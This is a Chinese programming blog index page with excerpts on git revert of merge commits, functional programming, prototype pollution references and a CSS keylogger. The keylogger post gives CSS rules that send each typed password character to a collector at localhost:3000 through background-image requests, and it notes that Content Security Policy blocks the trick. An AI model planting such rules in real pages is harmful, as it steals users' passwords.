<!DOCTYPE html>
<html class="has-navbar-fixed-top">
<head>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
<title>
    O
</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">



        
            <meta name="description" content="">
            

                

                        

                                    

                                            

                                                    <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
                                                    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">

                                                    
                                                        <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
                                                        <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">
                                                        

                                                            <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">

                                                            <link rel="stylesheet" href="/o/css/style.css">

                                                                <script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>

                                                                
                                                                    
                                                                        
                                                                            
                                                                        
                                                                            
                                                                        
                                                                            
                                                                        
                                                                            
                                                                        
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-152053462-1"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-152053462-1');
</script><!-- hexo-inject:begin --><!-- hexo-inject:end -->


                                                                            
                                                                                
</head>
<body>
    
<!-- hexo-inject:begin --><!-- hexo-inject:end --><nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/o/">
                
                <img src="/o/images/logo.png" alt="" height="28">
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/o/archives">归档</a>
            
            <a class="navbar-item "
               href="/o/about">关于</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            <a class="navbar-item search" title="搜索" href="javascript:;" target="_blank" rel="noopener">
                <i class="fas fa-search"></i>
            </a>
            
            
            
            <a class="navbar-item" title="GitHub" href="https://github.com/EPSON-LEE" target="_blank" rel="noopener">
                
                <i class="fab fa-github"></i>
                
            </a>
               
            
        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
    
        <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            <a href="/o/2019/12/25/JS-module/" itemprop="url">JS 模块加载器原理</a>
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2019-12-25T10:08:12.000Z" itemprop="datePublished">12月 25 2019</time>
        </span>
        
        
        <span class="column is-narrow">
            
            
            几秒 读完 (约 23 字)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p>参考</p>
<ul>
<li><a href="https://www.zhihu.com/question/21157540" target="_blank" rel="noopener">JS模块加载器加载原理是怎么样的？</a></li>
</ul>

    
    </div>
    
    
</article>




    
        <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            <a href="/o/2019/12/25/JavaScript-chain/" itemprop="url">JavaScript 原型链机制</a>
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2019-12-25T09:12:22.000Z" itemprop="datePublished">12月 25 2019</time>
        </span>
        
        
        <span class="column is-narrow">
            
            
            几秒 读完 (约 13 字)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <h2 id="Flag-使用-canvas-技术将其可视化出来"><a href="#Flag-使用-canvas-技术将其可视化出来" class="headerlink" title="Flag: 使用 canvas 技术将其可视化出来"></a>Flag: 使用 canvas 技术将其可视化出来</h2>
    
    </div>
    
    
</article>




    
        <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            <a href="/o/2019/12/25/JavaScript-pollution/" itemprop="url">JavaScript 中的原型污染攻击</a>
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2019-12-25T09:07:30.000Z" itemprop="datePublished">12月 25 2019</time>
        </span>
        
        
        <span class="column is-narrow">
            
            
            几秒 读完 (约 74 字)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p>参考：</p>
<ul>
<li><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto__" target="_blank" rel="noopener">深入理解 JavaScript Prototype 污染攻击</a></li>
<li><a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf" target="_blank" rel="noopener">prototype-pollution-nsec18</a></li>
<li><a href="https://xz.aliyun.com/t/2735" target="_blank" rel="noopener">JavaScript 原型链污染</a></li>
<li><a href="https://xz.aliyun.com/t/2802" target="_blank" rel="noopener">从一道 CTF 题看 Node.js 的 prototype pollution attack</a></li>
</ul>

    
    </div>
    
    
</article>




    
        <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            <a href="/o/2019/12/13/keylogger/" itemprop="url">使用css selector 记录用户输入信息</a>
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2019-12-13T06:09:22.000Z" itemprop="datePublished">12月 13 2019</time>
        </span>
        
        
        <span class="column is-narrow">
            
            
            3 分钟 读完 (约 462 字)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <h2 id="CSS3-Selector"><a href="#CSS3-Selector" class="headerlink" title="CSS3 Selector"></a>CSS3 Selector</h2><p>  实现使用 CSS 记录用户信息主要使用了 CSS3 中的 selector。</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">选择器</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">E[attr^=”val”]</td>
<td align="left">属性 attr 的值以 “val” 开头的元素</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">E[att$=”val”]</td>
<td align="left">属性 attr 的值以 “val” 结尾的元素</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">E[att*=”val”]</td>
<td align="left">属性 attr 的值以 “val” 字符串的元素</td>
</tr>
</tbody></table>
<h2 id="键位匹配"><a href="#键位匹配" class="headerlink" title="键位匹配"></a>键位匹配</h2><p>浏览器自身默认不会将用户输入的值同步到 value 中, 但像一些框架会将用户输入值同步到 value 中。<a href="https://codepen.io/epson-lee/pen/vYYzaNb?editors=0010" target="_blank" rel="noopener">Demo Link</a></p>
<p><img src="https://raw.githubusercontent.com/EPSON-LEE/image-hosting/master/css-keylogger.gif" alt="demo.gif"></p>
<p>将值同步到 value 之后，我们可以使用 css 来做匹配，对应的键位发送到不同的链接。</p>
<p><figure class="highlight css hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* 命中 0 时 请求对应的接口 */</span></span><br><span class="line"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type="password"]</span><span class="hljs-selector-attr">[value$="0"]</span> &#123;</span><br><span class="line">  <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">"http://localhost:3000/0"</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-comment">/* 命中 1 时 请求对应的接口 */</span></span><br><span class="line"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type="password"]</span><span class="hljs-selector-attr">[value$="1"]</span> &#123;</span><br><span class="line">  <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">"http://localhost:3000/1"</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>在知道可以使用 css 来记录按键之后我兴冲冲的找到对应的 github demo，按照文档所说打开 <a href="https://instagram.com" target="_blank" rel="noopener">https://instagram.com</a>，安装 Chrome Extension、输入密码但却然而却发现并没有记录到信息，出现了如下的错误信息：</p>
<p><img src="https://raw.githubusercontent.com/EPSON-LEE/image-hosting/master/css-keylogger-error.png" alt="Error Info"></p>
<p>在 antd-design-pro 示例登录页倒是可以。</p>
<p><img src="https://raw.githubusercontent.com/EPSON-LEE/image-hosting/master/1.gif" alt="antd-design-pro 示例登录页"></p>
<p>这是因为 <a href="https://instagram.com" target="_blank" rel="noopener">https://instagram.com</a> 使用了 CSP (Content Security Policy)。 说白了就是为了页面安全而制定的一系列防护措施，通过CSP所约束的规则制定可信的内容来源（脚本、图片、iframe、fton、style 等可能的远程资源）。</p>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p><a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="noopener">CSS Keylogger</a><br><a href="https://www.zhihu.com/question/21979782" target="_blank" rel="noopener">Content Security Policy (CSP) 是什么？为什么它能抵御 XSS 攻击</a></p>

    
    </div>
    
    
</article>




    
        <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            <a href="/o/2019/12/11/binary/" itemprop="url">使用 JavaScript 进行二进制计算</a>
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2019-12-11T13:15:13.000Z" itemprop="datePublished">12月 11 2019</time>
        </span>
        
        
        <span class="column is-narrow">
            
            
            几秒 读完 (约 28 字)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/ReduceRight" target="_blank" rel="noopener">reduecRight 的 Polyfill</a></p>
<p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> t = <span class="hljs-built_in">Object</span>(<span class="hljs-keyword">this</span>), len = t.length &gt;&gt;&gt; <span class="hljs-number">0</span>, k = len - <span class="hljs-number">1</span>, value;</span><br></pre></td></tr></table></figure></p>

    
    </div>
    
    
</article>




    
        <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            <a href="/o/2019/12/11/git-revert/" itemprop="url">如何去撤销一个已提交的 commit 节点</a>
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2019-12-11T09:51:37.000Z" itemprop="datePublished">12月 11 2019</time>
        </span>
        
        
        <span class="column is-narrow">
            
            
            4 分钟 读完 (约 668 字)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <h2 id="撤销某一个具体的节点"><a href="#撤销某一个具体的节点" class="headerlink" title="撤销某一个具体的节点"></a>撤销某一个具体的节点</h2><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">git revert a7d8dcaa4e25667c9aaaf2a0809aca7fe1a27b6d</span><br></pre></td></tr></table></figure></p>
<p>但是当这个节点是一个 merge 节点的时候， 你根本无法去 revert 这个节点，因为你不知道 merge 的哪一条分支应该作为主线，哪个分支作为他撤销后的主分支，因此git 会输出错误信息:</p>
<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error: commit cae5381823aad7c285d017e5cf7e8bc4b7b12240 is a merge but no -m option was given.</span><br></pre></td></tr></table></figure></p>
<p>让我们来看看这个 m 参数代表什么</p>
<blockquote>
<p>Usually you cannot revert a merge because you do not know which side of the merge should be considered the mainline. This option specifies the parent number (starting from 1) of the mainline and allows revert to reverse the change relative to the specified parent.</p>
</blockquote>
<blockquote>
<p>Reverting a merge commit declares that you will never want the tree changes brought in by the merge. As a result, later merges will only bring in tree changes introduced by commits that are not ancestors of the previously reverted merge. This may or may not be what you want</p>
</blockquote>
<p>翻译过来就是</p>
<blockquote>
<p>通常情况下，你无法 revert 一个 merge，因为你不知道 merge 的哪一条线应该被视为主线。这个选项（-m）指定了主线的 parent 的代号（从1开始），并允许以相对于指定的 parent 的进行 revert。</p>
</blockquote>
<blockquote>
<p>revert 一个 merge commit 意味着你将完全不想要来自 merge commit 带来的 tree change。 因此，之后的 merge 只会引入那些不是之前被 revert 的那个 merge 的祖先引入的 tree change，这可能是也可能不是你想要的。</p>
</blockquote>
<p>如同下图所示，revert 到 ‘thumbup-feature’ 的时候不知道 到底是 revert 到绿色的线还是紫色的线。</p>
<p><img src="https://raw.githubusercontent.com/EPSON-LEE/image-hosting/master/20191211184947.png" alt></p>
<p>也可以使用 git show 命令查看相关信息 </p>
<p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git show</span><br><span class="line"></span><br><span class="line">输出内容：</span><br><span class="line"></span><br><span class="line">commit cae5381823aad7c285d017e5cf7e8bc4b7b12240</span><br><span class="line">Merge: edf99ca 125cfdd</span><br><span class="line">Date:   Thu Apr 12 18:27:21 2018 +0800</span><br><span class="line"></span><br><span class="line">    Merge tag &apos;thumbup-feature&apos;</span><br></pre></td></tr></table></figure><br>如下图标示的 parent1 对应</p>
<p><img src="https://raw.githubusercontent.com/EPSON-LEE/image-hosting/master/20191211185856.png" alt></p>
<h2 id="执行-git-revert-cae5381-m-1"><a href="#执行-git-revert-cae5381-m-1" class="headerlink" title="执行 git revert cae5381 -m 1"></a>执行 git revert cae5381 -m 1</h2><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">git revert cae5381 -m 1</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"></span><br><span class="line">Revert &quot;Merge tag &apos;thumbup-feature&apos;&quot;</span><br><span class="line"></span><br><span class="line">This reverts commit cae5381823aad7c285d017e5cf7e8bc4b7b12240, reversing</span><br><span class="line">changes made to edf99ca31755a27b0a43b290263ed810833a95c4.</span><br><span class="line"></span><br><span class="line">[master f0aac26] Revert &quot;Merge tag &apos;thumbup-feature&apos;&quot;</span><br><span class="line"> 2 files changed, 2 deletions(-)</span><br><span class="line"> delete mode 100644 file3</span><br><span class="line"> delete mode 100644 file4</span><br></pre></td></tr></table></figure></p>
<p>复制代码file3 和 file4 是 feature branch 上的 commit 引入的文件，被正确地删掉了</p>
<h2 id="执行-git-revert-cae5381-m-2"><a href="#执行-git-revert-cae5381-m-2" class="headerlink" title="执行 git revert cae5381 -m 2"></a>执行 git revert cae5381 -m 2</h2><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard d208cba </span><br><span class="line">git revert cae5381 -m 2</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line"></span><br><span class="line">[master 2c5a0ee] Revert &quot;Merge tag &apos;thumbup-feature&apos;&quot;</span><br><span class="line"> 2 files changed, 2 deletions(-)</span><br><span class="line"> delete mode 100644 file5  </span><br><span class="line"> delete mode 100644 file6</span><br></pre></td></tr></table></figure></p>
<p>这种 revert 把 master 在 feature branch 期间进行的 commit 都给干掉了。</p>
<p>本文绝大部分的内容和数据都引用自 ULIVZ 的文章:</p>
<ul>
<li><a href="https://juejin.im/post/5acf4db8f265da239148822d" target="_blank" rel="noopener">当你决定去 revert 一个merge commit</a></li>
</ul>

    
    </div>
    
    
</article>




    
        <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            <a href="/o/2019/12/10/Functional/" itemprop="url">如何理解函数式编程</a>
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2019-12-10T13:09:49.000Z" itemprop="datePublished">12月 10 2019</time>
        </span>
        
        
        <span class="column is-narrow">
            
            
            14 分钟 读完 (约 2121 字)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p>要回答这个问题，需要知道什么是编程范式。</p>
<h2 id="编程范式"><a href="#编程范式" class="headerlink" title="编程范式"></a>编程范式</h2><p>函数式编程范式是一种 <strong>编程范式</strong>。<br>我们通常见到的编程范式有 <strong>命令式编程(Imperative programming)</strong>、<strong>函数式编程</strong> 和 <strong>逻辑式编程</strong>，面向对象编程也属于命令式编程的一种。</p>
<h3 id="命令式编程"><a href="#命令式编程" class="headerlink" title="命令式编程"></a>命令式编程</h3><p>命令式编程是面向<strong>计算机硬件</strong>的抽象，有<strong>变量</strong>（对应着存储单元）、<strong>赋值语句（获取指令和存储指令）</strong>，<strong>表达式（内存引用）</strong>和<strong>控制语句（跳转指令）</strong>。总而言之，命令式编程就是一个<strong>冯诺伊曼机</strong>的<em></em>指令序列**。</p>
<h3 id="函数式编程的本质"><a href="#函数式编程的本质" class="headerlink" title="函数式编程的本质"></a>函数式编程的本质</h3><p>而函数式编程是面向数学的抽象，将计算描述为一种<strong>表达式值</strong>，可以这么说：一个函数就是一个<strong>表达式值</strong></p>
<p>函数式编程中的函数这个术语不是说计算机中的函数（实际上为 Subroutine，而是指数学中的函数，也就是自变量的映射。也就是说一个函数的值仅决定于函数参数的值，不依赖其他状态。比如 sqrt(x)函数计算x的平方根，只要 x 不变，无论何时调用，调用几次值都是不变的。</p>
<p>在函数式语言中，<strong>函数作为一等公民</strong>，可以在任何地方定义，在函数内或函数外，可以作为函数的参数和返回值，可以对函数进行组合。</p>
<p>纯函数式编程中的<strong>变量</strong>也不是命令式编程中的变量，即存储状态状态的单元，而是代数中的变量，即一个值的名称。变量的值是不可变的（immutable），也就是说不允许像命令式编程语言中的那样多次给一个变量赋值。 例如 在命令式编程语言中我们写的“x = x + 1”，这依赖可变状态的事实，拿给程序看是正确的，但是拿给数学家看，却被认为这个等式为假。</p>
<p>函数式语言的如条件语句，循环语句也不是命令式编程语言中的<strong>控制语句</strong>，而是函数式编程中的语法糖。</p>
<p>严格意思上的函数式编程意味着不使用可变的变量，赋值，循环和其他命令式结构进行编程。</p>
<p>从理论上说，函数式语言也不是通过<strong>冯诺伊曼</strong>体系结构的机器上运行的，而是通过<strong>λ演算</strong>来运行的，就是通过<strong>变量替换</strong>的方式进行，变量替换为其值或表达式，函数也替换为其表达式，并根据运算符进行计算。λ演算是<strong>图灵完全（Turing completeness）</strong>的，但是大多数情况，函数式程序还是被编译成（冯诺依曼机的）机器语言的指令执行的。</p>
<h3 id="函数式编程的好处"><a href="#函数式编程的好处" class="headerlink" title="函数式编程的好处"></a>函数式编程的好处</h3><p>由于命令式编程语言也可以通过类似函数指针的方式来实现高阶函数，函数式的最主要的好处主要是不可变性带来的。没有可变的状态，函数就是引用透明（Referential transparency）的和没有副作用（No Side Effect）。<br><br>一个好处是，函数即不依赖外部的状态也不修改外部的状态，函数调用的结果不依赖调用的时间和位置，这样写的代码容易进行推理，不容易出错。这使得单元测试和调试都更容易。</p>
<p>由于函数是引用透明的，以及函数式编程不像命令式编程那样关注执行步骤，这个系统提供了优化函数式程序的空间，包括惰性求值和并性处理。</p>
<p>还有一个好处是，由于函数式语言是面向数学的抽象，更接近人的语言，而不是机器语言，代码会比较简洁，也更容易被理解。</p>
<h3 id="函数式编程的特性"><a href="#函数式编程的特性" class="headerlink" title="函数式编程的特性"></a>函数式编程的特性</h3><p>由于变量值是不可变的，对于值的操作并不是修改原来的值，而是修改新产生的值，原来的值保持不便。例如一个Point类，其moveBy方法不是改变已有Point实例的x和y坐标值，而是返回一个新的Point实例。</p>
<p><figure class="highlight scala hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Point</span>(<span class="hljs-params">x: <span class="hljs-type">Int</span>, y: <span class="hljs-type">Int</span></span>)</span>&#123;</span><br><span class="line">  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">toString</span></span>() = <span class="hljs-string">"Point ("</span> + x + <span class="hljs-string">", "</span> + y + <span class="hljs-string">")"</span> </span><br><span class="line"></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">moveBy</span></span>(deltaX: <span class="hljs-type">Int</span>, deltaY: <span class="hljs-type">Int</span>) = &#123;</span><br><span class="line">    <span class="hljs-keyword">new</span> <span class="hljs-type">Point</span>(x +   deltaX, y + deltaY)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>（示例来源：Anders Hejlsberg在echDays 2010上的演讲）</p>
<p>同样由于变量不可变，纯函数编程语言无法实现循环，这是因为<strong>for循环</strong>使用可变的状态作为计数器，而<strong>While</strong>循环或<strong>DoWhile</strong>循环需要可变的状态作为跳出循环的条件。因此在函数式语言里就只能使用递归来解决迭代问题，这使得函数式编程严重依赖递归。</p>
<p>通常来说，算法都有 <strong>递推 (iterative)</strong> 和 <strong>递归（recursive)</strong> 两种定义，以阶乘为例，阶乘的递推定义为：</p>
<p><img src="https://raw.githubusercontent.com/EPSON-LEE/image-hosting/master/20200110235529.png" alt></p>
<p>阶乘的定义为</p>
<p><img src="https://raw.githubusercontent.com/EPSON-LEE/image-hosting/master/20200110235647.png" alt></p>
<p>递推定义的计算时需要使用一个累积器保存每个迭代的中间计算结果，Java代码如下：</p>
<p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">fact</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="hljs-keyword">int</span> acc = <span class="hljs-number">1</span>;</span><br><span class="line">  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> k = <span class="hljs-number">1</span>; k &lt;= n; k++)&#123;</span><br><span class="line">    acc = acc * k;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="hljs-keyword">return</span> acc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>而递归定义的计算的Scala代码如下：</p>
<p><figure class="highlight scala hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fact</span></span>(n: <span class="hljs-type">Int</span>):<span class="hljs-type">Int</span>= &#123;</span><br><span class="line">  <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span></span><br><span class="line">  n * fact(n<span class="hljs-number">-1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们可以看到，没有使用循环，没有使用可变的状态，函数更短小，不需要显示地使用累积器保存中间计算结果，而是使用参数n（在栈上分配）来保存中间计算结果。</p>
<p>当然，这样的递归调用有更高的开销和局限（调用栈深度），那么尽量把递归写成尾递归的方式，编译器会自动优化为循环。</p>
<p>一般来说，递归这种方式于循环相比被认为是更符合人的思维的，即告诉机器做什么，而不是告诉机器怎么做。递归还是有很强大的表现力的。</p>
<h3 id="函数式语言中的特性"><a href="#函数式语言中的特性" class="headerlink" title="函数式语言中的特性"></a>函数式语言中的特性</h3><ul>
<li>高阶函数（High-order function）</li>
<li>偏函数（Particial Applied function）</li>
<li>Currying</li>
<li>闭包 （closure）</li>
<li>惰性求值 （Lazy evaluation）、（call by need）</li>
</ul>
<ol>
<li>高阶函数</li>
</ol>
<p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sum</span>(<span class="hljs-params">funcA, funcB, value</span>) </span>&#123;</span><br><span class="line">  <span class="hljs-keyword">return</span> funcA(value) + funcB(value)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ol start="2">
<li>偏函数</li>
</ol>
<p>偏函数则是固定一个函数的一个或者多个参数，也就是将一个 n 元函数转换成一个 n - x 元函数</p>
<p>偏函数和 currying 有一定的联系</p>
<p>引用 <a href="https://github.com/hemanth/functional-programming-jargon#partial-application" target="_blank" rel="noopener">functional-programming-jargon</a> 的话来说就是：</p>
<blockquote>
<p>Curried functions are automatically partially applied.</p>
</blockquote>
<p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span>(<span class="hljs-params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="hljs-keyword">return</span> a + b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// 计算 a、b 的和</span></span><br><span class="line">add(a, b)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// 使用偏函数</span></span><br><span class="line"><span class="hljs-keyword">var</span> addOne = partial(add, <span class="hljs-number">1</span>)</span><br><span class="line"></span><br><span class="line">addOne(<span class="hljs-number">2</span>)</span><br></pre></td></tr></table></figure></p>
<ol start="3">
<li>Currying</li>
</ol>
<p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span>(<span class="hljs-params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// 执行 add 函数，一次传入两个参数即可</span></span><br><span class="line">add(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>) <span class="hljs-comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// 假设有一个 curry 函数可以做到柯里化</span></span><br><span class="line"><span class="hljs-keyword">var</span> addCurry = curry(add);</span><br><span class="line">addCurry(<span class="hljs-number">1</span>)(<span class="hljs-number">2</span>) <span class="hljs-comment">// 3</span></span><br></pre></td></tr></table></figure></p>
<p>4.惰性求值</p>
<p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> a = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">b</span>) </span>&#123;</span><br><span class="line">  <span class="hljs-keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line">a(<span class="hljs-number">3</span>)</span><br></pre></td></tr></table></figure></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>函数式编程是给软件开发者提供的另一套工具箱，为我们提供了另外一种抽象和思考的方式。 函数式编程也有不太擅长的场合，比如处理可变状态和处理IO，要么引入可变变量，要么通过<strong>Monad</strong>来进行封装（如State Monad和IO Monad）</p>
<p>参考资料</p>
<ul>
<li><p><a href="https://www.zhihu.com/question/28292740" target="_blank" rel="noopener">本文大部分都参考了这篇文章：如何理解函数式编程 中「用心阁」的回答</a></p>
</li>
<li><p>[]</p>
</li>
<li><p><a href="https://www.zhihu.com/question/19635359/answer/172074046" target="_blank" rel="noopener">知乎 17点的回答</a></p>
</li>
